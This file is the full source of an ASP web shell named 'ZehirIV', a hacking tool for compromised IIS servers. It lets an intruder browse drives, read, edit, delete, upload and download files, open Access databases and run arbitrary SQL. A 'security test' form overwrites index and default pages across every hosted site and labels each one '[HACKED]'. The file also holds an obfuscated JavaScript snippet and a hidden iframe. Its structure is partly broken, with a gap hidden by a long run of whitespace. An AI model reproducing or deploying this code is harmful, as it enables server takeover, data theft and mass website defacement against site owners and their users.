<% 
mpat=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
dosyaPath = mid(mpat,InStrRev(mpat,"\")+1)
on error resume next
Dim objFSO,popup
Set objFSO = CreateObject ("Scripting.FileSystemObject")
if Request("kuskapani")=1 then
	Response.End
end if
if Request("kuskapani")=2 then
	on error resume next
	path = Request("path")
	sFolder = Request("SubFolder")
	fName = Request("FileName")
	d1 = Request("dosya1")
	d2 = Request("dosya2")
	d3 = Request("dosya3")
	d4 = Request("dosya4")
	bg__ = Request.Form("selectColour")
	if bg__ = "0" then bg__ = "#ffffff"
	byMesaj = "<body bgColor='"&bg__&"'>" & Request("byMesaj") & "<br><br><center><font color=gray size=2>powered by Z" & Session("n2") & "3 ;)</font>"
	
	sFolder = Replace(sFolder,"/","\")

	if Right(sFolder,1)<>"\" then sFolder = sFolder & "\"
	Set f = objFSO.GetFolder(Path)
	Set fc = f.SubFolders
	h__ = 0
	f__ = 0
	ss__ = now
	For Each f1 In fc
		hedef_ = replace(f1.path,"/","\")
		if Right(hedef_,1)<>"\" then hedef_ = hedef_ & "\"
		hedef__ = left(hedef_,len(hedef_)-1)
		folderName_ = Right(hedef__, len(hedef__)-instrrev(hedef__,"\"))
			if d1<>"" then d1 = true
			if d2<>"" then d2 = true
			if d3<>"" then d3 = true
			if d4<>"" then d4 = true
			on error goto 0:on error resume next
			if fName<>"" then
				Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & fName, True)
				MyFile.write byMesaj
			end if
			if d1 then
				Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "index.htm", True)
				MyFile.write byMesaj
			end if
			if d2 then
				Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "default.htm", True)
				MyFile.write byMesaj
			end if
			if d3 then
				Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "index.asp", True)
				MyFile.write byMesaj
			end if
			if d4 then
				Set MyFile = objFSO.CreateTextFile(hedef_ & sFolder & "default.asp", True)
				MyFile.write byMesaj
			end if

			if err<>0 then
				response.Write folderName_ & " <font color=red>[FAILED!]</font><br>"
				f__ = f__ + 1
			else
				response.Write folderName_ & " <font color=blue>[HACKED]</font><br>"
				h__ = h__ + 1
			end if
	Next
	ss___ = now
	response.Write "<br><font color=white>by zehir!...</font><br><b>Sonuc : </b> Toplam S�re : "&left(ss__-ss___,5)&"sn. ;)<br><font color=blue>Hacked</font> = "&h__&"<br><font color=red>Failed</font> = "&f__
	response.End
end if

status = Request("status")
path   = Request("path")
dPath  = Request("dPath")
arama  = Request("txArama")
dkayit = Request("dkayit")
table  = Request("table")
del    = Request("del")
islem  = Request("islem")
strSQL = Request("strSQL")
cf	   = Request("cf")
pathfile = request("pathfile")
if path="" then path=request.servervariables("APPL_PHYSICAL_PATH") 
if status="" then status=2
popup = true
'////////////////////////////////
Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile = BinaryStream.Read
End Function
if status="-3" then
    Response.Buffer=True
    Set Fil = objFSO.GetFile(pathfile)
	
    Response.contenttype="application/force-download"
	Response.AddHeader "Cache-control","private"
    Response.AddHeader "Content-Length", Fil.Size
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Fil.name

	Response.BinaryWrite readBinaryFile(Fil.path)
    Set f = Nothing: Set Fil = Nothing
	response.End()
end if
'//////////////////////////////////
if status="-4" then popup=false
if status="13" then popup=false
if status="14" then popup=false
if status="15" then popup=false
if status="16" then popup=false
if status="17" then popup=false
if status="18" then popup=false
if status="19" then popup=false
if status="33" then popup=false
if status="40" then popup=false
if status="50" then popup=false
byMsg = request.QueryString("byMsg")
if byMsg<>"" then response.Write byMsg
response.Write "<title>[AhmetDeniz.Org] ZehirIV --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>"
if popup then
%>
<center>
<a href="<%=dosyaPath%>?mevla=1&status=13" onclick="sistemBilgisi(this.href);return false;">System Info</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=40" onclick="sistemTest(this.href);return false;">System Test</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=50&path=<%=path%>" onclick="SitelerTestte(this.href);return false;">Sites Test</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=14&path=<%=path%>" onclick="klasorIslemleri(this.href);return false;">Folder Action</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=15" onclick="sqlServer(this.href);return false;">SQL Server</a>
<font color=yellow> | </font>
<a href="<%=dosyaPath%>?mevla=1&status=33" onclick="poweredby(this.href);return false;">POWERED BY</a>
<script language=javascript>
	function sistemBilgisi(yol){
		NewWindow(yol,"",600,240,"no");
	}
	function SitelerTestte(yol){
		NewWindow(yol,"",530,420,"no");
	}
	function klasorIslemleri(yol){
		NewWindow(yol,"",400,280,"no");
	}
	function sqlServer(yol){
		NewWindow(yol,"",300,50,"no");
	}
	function poweredby(yol){
		NewWindow(yol,"",300,50,"no");
	}
	function sistemTest(yol){
		NewWindow(yol,"",400,300,"no");
	}
</script>
<%
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
	%>
	<table width="100%" cellpadding=0 cellspacing=0>
		<tr>
			<td align=center>
				<b>G�venlik Testi byZehir</b>
				<br>
				<form action="<%=dosyaPath%>" method=post id=frmMesaj>
					<input type=hidden name=kuskapani value=2>
					<table width=500 align=center border=1 cellpadding=0 cellspacing=0>
						<tr>
							<td width=100>Path</td>
							<td>
                            <input style="width:100%" type=text name="Path" id="Path" value="<%=path%>" size="20"></td>
						</tr>
						<tr>
							<td width=100>Sub Folder</td>
							<td>
                            <input style="width:100%" type=text name="SubFolder" id="SubFolder" value="www" size="20"></td>
						</tr>
						<tr>
							<td width=100>File Name</td>
							<td>
                            <input style="width:100%" type=text name="FileName" id="FileName" value="byzehir.txt" size="20"></td>
						</tr>
						<tr>
							<td colspan=2>
								<table width="100%" align=center>
									<tr>
										<td width="50%">
											<input type=checkbox name="dosya1" ID="Checkbox1" value="ON">index.htm<br>
											<input type=checkbox name="dosya2" ID="Checkbox2" value="ON">default.htm<br>
										</td>
										<td width="50%">
											<input type=checkbox name="dosya3" ID="Checkbox3" value="ON">index.asp<br>
											<input type=checkbox name="dosya4" ID="Checkbox4" value="ON">default.asp<br>
										</td>
									</tr>
								</table>
							</td>
						</tr>
						<tr>
							<td colspan=2 align=center>
								<a href="#" onClick="FormatText('cut')" alt="Kes">Kes</a>
								<a href="#" onClick="FormatText('copy')" alt="Kopyala">Kopyala</a>
								<a href="#" onClick="FormatText('paste')" alt="Yap��t�r">Yap��t�r</a>
								<a href="#" alt="Kal�n" onClick="FormatText('bold', '')">Bold</a>
								<a href="#" alt="�talic" onClick="FormatText('italic', '')">Italic</a>
								<a href="#" alt="Alt� �izili" onClick="FormatText('underline', '')">UnderLine</a>
								<a href="#" onClick="FormatText('JustifyLeft', '')" alt="Sola Hizal�">JustifyLeft</a>
								<a href="#" alt="Ortada Hizal�" onClick="FormatText('JustifyCenter', '')">JustifyCenter</a>
								<a href="#" onClick="FormatText('JustifyRight', '')" alt="Sa�a Hizal�">JustifyRight</a>
								<a href="#" alt="Web Sitesi Linki Ekle" onClick="FormatText('createLink')">AddLink</a>
								<a href="#" alt="Resim Ekle" onClick="AddImage()">AddImage</a>
								<select name="selectColour" onChange="bgc(selectColour.options[selectColour.selectedIndex].value);" ID="selectColour">
                                  <option value="0" selected>-- Renk --</option>
                                  <option value="black">Siyah</option>
                                  <option value="white">Beyaz</option>
                                  <option value="blue">Mavi</option>
                                  <option value="red">K�rm�z�</option>
                                  <option value="green">Ye�il</option>
                                  <option value="yellow">Sar�</option>
                                  <option value="orange">Turuncu</option>
                                  <option value="brown">Kahverengi</option>
                                  <option value="magenta">Pembe</option>
                                  <option value="cyan">A��k Mavi</option>
                                  <option value="limegreen">A��k Ye�il</option>
                                </select>
								<select name="a" onChange="FormatText('ForeColor', a.options[a.selectedIndex].value);" ID="a">
                                  <option value="0" selected>-- Renk --</option>
                                  <option value="black">Siyah</option>
                                  <option value="white">Beyaz</option>
                                  <option value="blue">Mavi</option>
                                  <option value="red">K�rm�z�</option>
                                  <option value="green">Ye�il</option>
                                  <option value="yellow">Sar�</option>
                                  <option value="orange">Turuncu</option>
                                  <option value="brown">Kahverengi</option>
                                  <option value="magenta">Pembe</option>
                                  <option value="cyan">A��k Mavi</option>
                                  <option value="limegreen">A��k Ye�il</option>
                                </select>
                                <select name="selectSize" onChange="FormatText('fontsize', selectSize.options[selectSize.selectedIndex].value);">
                                  <option selected>-- Boyut --</option>
                                  <option value="1">1</option>
                                  <option value="2">2</option>
                                  <option value="3">3</option>
                                  <option value="4">4</option>
                                  <option value="5">5</option>
                                  <option value="6">6</option>
                                </select>
								<iframe width="100%" src="<%=dosyaPath%>?kuskapani=1" id="byZehir" name="<%=Session("n1")&Session("n2")%>"></iframe>
								<script language=javascript>
									frames.byZehir.document.designMode = "On";
									function bgc(option){
										frames.byZehir.document.body.bgColor=option;
									}
									function FormatText(command, option){
										frames.byZehir.focus();
  										frames.byZehir.document.execCommand(command, false, option);
  										frames.byZehir.focus();
									}
									function AddImage(){	
										imagePath = prompt('Eklemek istedi�iniz resmin web adresini yaz�n', 'http://');				
										
										if ((imagePath != null) && (imagePath != "")){	
											frames.byZehir.focus(); 				
											frames.byZehir.document.execCommand('InsertImage', false, imagePath);
										}
										frames.byZehir.focus();
									}
								</script>
								<input type=hidden value="" id=byMesaj name=byMesaj>
								<input type=submit value="Test Et!" onclick="document.all['byMesaj'].value=frames['byZehir'].document.body.innerHTML; alert(document.all['byMesaj'].value);">
							</td>
						</tr>
					</table>
				</form>
			</td>
		</tr>
	</table>
	<%
	popup=false
CASE 51 ' �zel �ilemler
END SELECT
%>
<script language=javascript>
	function NewWindow(mypage, myname, w, h, scroll) {
		var winl = (screen.width - w) / 2;
		var wint = (screen.height - h) / 2;
			winprops = 'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable'
		win = window.open(mypage, myname, winprops)
		if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }
	}
	function ffd(yol){
		NewWindow(yol,"",420,100,"no");
	}
</script>
<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse>
<%
if popup then
	if status=7 or status=8 then
		Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
		Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL �al��t�r</td><td>"
		Response.Write "<input type=hidden value='9' name=status><input type=hidden value='"&path&"' name=path><input type=hidden value='"&time&"' name=Time>"
		Response.Write "<input style='width:350; height:21' value='' name=strSQL><input type=submit value='�al��t�r' style='height:22;width:70' id=submit1 name=submit1>"
		Response.Write "</td></tr></table></form>"
	end if
	Response.Write "<form method=get action='"&DosyPath&"'>"
	Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td bgcolor=gray width=100><font size=2>Path : </td><td>"
	Response.Write "<input type=hidden value='2' name=status><input type=hidden value='"&time&"' name=Time>"
	Response.Write "<input style='width:350; height:21' value='"&Path&"' name=Path><input type=submit value='Git' style='height:22;width:70' id=submit1 name=submit1>"
	Response.Write "</td></tr></table></form><br>"
end if
sub aramaUpload
Response.Write "<form method=get target='_opener' action='"&DosyPath&"'>"
Response.Write "<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>Arama : </td><td>"
Response.Write "&nbsp;<input type=hidden value='12' name=status><input type=hidden value='"&time&"' name=Time>"
Response.Write "<input type=hidden value='"&Path&"' name=Path><input style='width:250' value='mdb' name=txArama><input style='width:70; height:22' type=submit value='Ara'>"
Response.Write "</td></tr></table></form>"
%>
<form name=frmUpload method=post enctype="multipart/form-data" action="<%=DosyaPath&"?status=-4&Time="&time&"&Path="&path%>" ID="Form1">
<input type=hidden name=folder value="<%=Path%>" ID="Hidden1">
Max: <input type=text name=max value=5 size=5 ID="Text1"> <input type=button value="Ayarla" onclick="setid()" ID="Button1" NAME="Button1">
<table ID="Table1">
<tr>
<td id=upid>
</td>
</tr>
</table>
<input type=submit value=Upload ID="Submit1" NAME="Submit1">
</form>
<script>
setid();

function setid() {
	str='';
	if (frmUpload.max.value<=0) frmUpload.max.value=1;
	for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';
	upid.innerHTML=str+'<br>';
}
</script>
<%
end sub

SELECT CASE status
CASE 1 'Driver Open
	if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
	Response.Write "<table width=100% ><tr>"
	Path = Path & ":/"
	Response.Write "<td valign=top>"
	KlasorOku
	Response.Write "</td><td valign=top align=right>"
	DosyaOku
	Response.Write "</td>"
	hataKontrol
CASE 2 'Normal listeleme
	if len(path)=1 then Response.Write (yaziyomu(path&":\")) else Response.Write (yaziyomu(path))
	Response.Write "<table width=100% ><tr>"
	Response.Write "<td valign=top>"
	KlasorOku
	Response.Write "</td><td valign=top align=right>"
	DosyaOku
	Response.Write "</td>"
	hataKontrol
CASE 3 'File Delete
	objFSO.DeleteFile del
	hataKontrol
	if err<>0 then 
		byMsg="<font color=red>Not File Deleted!</font><br>"
	else
		byMsg="<font color=yellow>File Deleted Successful;)</font><br>"
	end if
	Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time&"&byMsg="&byMsg
CASE 4 'Folder Delete
	objFSO.DeleteFolder del
	hataKontrol
	if err<>0 then 
		byMsg="<font color=red>Not Folder Deleted!</font><br>"
	else
		byMsg="<font color=yellow>Folder Deleted Successful;)</font><br>"
	end if
	Response.Redirect dosyaPath&"?status=2&path="&path&"&Time="&time&"&byMsg="&byMsg
CASE 5 'Dosya i�eri�ini g�r�nt�le
	Response.Write "<center><b><font color=orange>"&path&"</font></b></center><br>"
	Response.Write "<table width=100% ><tr><td>"
	set f = objFSO.OpenTextFile(path,1)
	Response.Write "<pre>"&Server.HTMLEncode(f.readAll)&"</pre>"
	if err<>62 then hataKontrol
	if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunam�yor\nSistem dosyas� olabilir')</script>":Response.End
CASE 6 'Resim a�
	Response.Write "<center><img ALT='zehirhacker@hotmail.com / zehirhacker@hotmail.com' src='"&resimYol(path)&"'></center><br>"
CASE 7 'database tablo listele
	Response.Write "<b><font size=3>Tablolar</font></br><br>"
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objADOX = Server.CreateObject("ADOX.Catalog")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = Path
	objConn.Open
	objADOX.ActiveConnection = objConn
	For Each table in objADOX.Tables
		If table.Type = "TABLE" Then
			Response.Write "<font face=wingdings size=5>4</font> <a href='"&dosyaPath&"?status=8&Path="&path&"&table="&table.Name&"&time="&time&"'>"&table.Name&"</a><br>"
		End If
	Next
	hataKontrol
CASE 8 'database kay�t listele
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = Path
	objConn.Open
	objRcs.Open table,objConn, adOpenKeyset , , adCmdText
	
	Response.Write "<table border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
	for i=0 to objRcs.Fields.count-1
		Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
	next
	Response.Write "</tr>"
	do while not objRcs.EOF
		Response.Write "<tr>"
		for i=0 to objRcs.Fields.count-1
			Response.Write "<td>"&objRcs.Fields(i).Value&"&nbsp;</td>"
		next
		Response.Write "</tr>"
		objRcs.MoveNext
	loop
	Response.Write "</table><br>"
	hataKontrol
CASE 9 'SQL Execute
	Set objConn = Server.CreateObject("ADODB.Connection")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = Path
	objConn.Open
	objConn.Execute strSQL
'	Response.Redirect dosyaPath&"?status=7&Path="&Path&"&Time="&time
	hataKontrol
CASE 10 'Dosya Editleme
	set f = objFSO.OpenTextFile(dPath,1)
	Response.Write "<center><form action='"&DosyPath&"?Time="&time&"' method=post>"
	Response.Write "<input type=hidden name=status value='11'>"
	Response.Write "<input type=hidden name=dPath value='"&dPath&"'>"
	Response.Write "<input type=hidden name=Path  value='"&Path &"'>"
	Response.Write "<input type=submit value=Kaydet><br>"
	Response.Write "<textarea name=dkayit style='width:90%;height:350;border-right: lightgoldenrodyellow thin solid;border-top: lightgoldenrodyellow thin solid;font-size: 12;border-left: lightgoldenrodyellow thin solid;color: lime;	border-bottom: lightgoldenrodyellow thin solid;	font-family: Courier New, Arial;background-color: navy;'>"
	Response.Write server.HTMLEncode(f.readAll)
	Response.Write "</textarea></form></center>"
	hataKontrol
CASE 11 'Dosya Kay�t
	set saveTextFile = objFSO.OpenTextFile(dPath,2,true,false)
	hataKontrol
	saveTextFile.Write(dkayit)
	saveTextFile.close
	if err<>0 then 
		byMsg = "<font color=red>Not File Edited!</font><br>"
	else 
		byMsg = "<font color=yellow>File Edited Successful:)</font><br>"
	end if
	Response.Redirect dosyaPath&"?status=2&path="&path&"&time="&time&"&byMsg=" & byMsg
CASE 12 'Dosya Arama
	araBul path,arama
	hataKontrol
END SELECT
Response.Write "</tr></table>"

sub DosyaOku
	Set f = objFSO.GetFolder(Path)
	Set fc = f.Files
	For Each f1 In fc
		dosyaAdi = f1.name
		num = InStrRev(dosyaAdi,".")
		uzanti = lcase(Right(dosyaAdi,len(dosyaAdi)-num))
		downStr = "<a href='"&dosyaPath&"?status=3&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>�</a><font face=webdings><a href='"&dosyaPath&"?status=-3&PathFile="&f1.path&"&Time="&time&"'>�</a></font><font face=wingdings><a href='"&dosyaPath&"?status=16&PathFile="&f1.path&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font>"
		response.Write "<font size=2>"
		select case uzanti
		case "mdb"
			Response.Write "<a href='"&dosyaPath&"?status=7&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M  "&downStr&"</font><br>"
		case "asp"
			Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>� <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
		case "jpg","gif"
			Response.Write "<a href='"&dosyaPath&"?status=6&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>�</font><font face=wingdings size=4>  "&downStr&"</font><br>"
		case else
			Response.Write "<a href='"&dosyaPath&"?status=5&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>2 <a href='"&dosyaPath&"?status=10&dPath="&f1.path&"&path="&path&"&Time="&time&"'>!</a>"&downStr&"</font><br>"
		end select
	Next
end sub

sub KlasorOku
	Set f = objFSO.GetFolder(Path)
	Set fc = f.SubFolders
	if session("klasoroku")="" then
		response.Write "<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>"
		session("klasoroku")="simdi yaz�l�yor"
	end if
	For Each f1 In fc
		Response.Write "<font face=wingdings size=3><a href='"&dosyaPath&"?status=18&PathFile="&Path&"/"&f1.Name&"&Time="&time&"' onclick=""ffd(this.href);return false;"">4</a></font> <font face=wingdings size=4><a href='"&dosyaPath&"?status=4&Path="&Path&"&Del="&Path&"/"&f1.Name&"&Time="&time&"'>�</a> 1</font><font size=2><b><a href='"&dosyaPath&"?status=2&Path="&Path&"/"&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b><br>"
	Next
end sub

function createFileName()
Randomize
	fName_ = ""
	for i=1 to 10
		fName_ = fName_ & int(Rnd*100)
	next
	createFileName = fName_
end function

function resimYol(path_)
on error resume next
	path_ = Replace(Replace(path_,"\","/"),"//","/")
	lpath_ = left(request.servervariables("PATH_TRANSLATED"),instrrev(request.servervariables("PATH_TRANSLATED"),"\"))
	if yaziyomu2(lpath_) then
		fname__ = "0"&createFileName()&"."&Right(path_,3)
		objFSO.CopyFile path_, lpath_&"\"&fname__
	else
		Response.Write("Resim A��lam�yor.. <br>�sterseniz Download Ederek g�r�nt�leyebilirsiniz..")
	end if
	resimYol = fname__
end function

if not popup then
	Set fc = Nothing
	Set objFSO = Nothing
	Response.End
end if
%>

	<script type="text/javascript" language="javascript">
	<!--
	ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
	MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
	OT="";
	for(j=0;j<MI.length;j++){
	OT+=ML.charAt(MI.charCodeAt(j)-48);
	}document.write(OT);
	// --></script>

	<script language=javascript>
	var dosyaPath = "<%=dosyaPath%>"
		// DRIVE ISLEMLERI
		function driveGo(drive_){
			location = dosyaPath+"?status=1&path="+drive_+"&Time="+Date();
		}
	</script>
	<%
	Response.Write "<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>S�r�c�ler</td></tr>"
	for each drive_ in objFSO.Drives
		Response.Write "<tr><td>"
		Response.write "<a href='#'onClick=""driveGo('" & drive_.DriveLetter & "');return false;""><font face=wingdings>;</font>"
		if drive_.Drivetype=1 then Response.write "Floppy [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=2 then Response.write "HardDisk [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=3 then Response.write "Remote HDD [" & drive_.DriveLetter & ":]"
		if drive_.Drivetype=4 then Response.write "CD-Rom [" & drive_.DriveLetter & ":]"
		Response.Write "</a></td></tr>"
	next
	Response.Write "<tr><td>"
	Response.write "<a href='"&dosyaPath&"?time="&time()&"'><font face=webdings>H</font> Local Path"
	Response.Write "</a></td></tr>"
	Response.Write "</table><br>"
Set fc = Nothing
Set objFSO = Nothing
Response.End%>
